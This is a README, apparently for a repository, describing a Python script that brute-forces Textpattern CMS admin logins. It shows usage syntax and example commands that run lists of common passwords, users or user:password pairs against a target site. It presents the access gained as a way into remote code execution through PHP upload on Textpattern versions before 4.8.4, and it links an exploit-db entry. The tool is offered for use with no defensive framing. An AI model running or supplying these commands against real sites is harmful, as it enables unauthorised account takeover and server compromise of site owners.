# textpattern-bruteforce

Script to brute-force websites using TextPattern CMS.

```
python3 bruteforce.py -t TARGET [-u USER] [-U USER_LIST] [-p PWD] [-P PWD_LIST] [-UP USERPWD_LIST]
```

You can use a single user (-u) or user list (-U), single password (-p) or password list (-P) or user:password list (-UP).

Examples:

- **python3 bruteforce.py -t ht<span>tps://</span>website.com/textpattern -u admin -P 500-most-common.txt** - Test the 500 most common passwords against user "admin"
- **python3 bruteforce.py -t ht<span>tps://</span>website.com/textpattern -U users.txt -P possible_passwords.txt** - Test a list of users and a list of passwords
- **python3 bruteforce.py -t ht<span>tps://</span>website.com/textpattern -UP userpass.txt** - Test a user:password list

It may be useful because Textpattern versions previous to 4.8.4 ([released past November](https://github.com/textpattern/textpattern/releases/tag/4.8.4)) allow remote code execution [by uploading any PHP file to the website](https://www.exploit-db.com/exploits/48943).
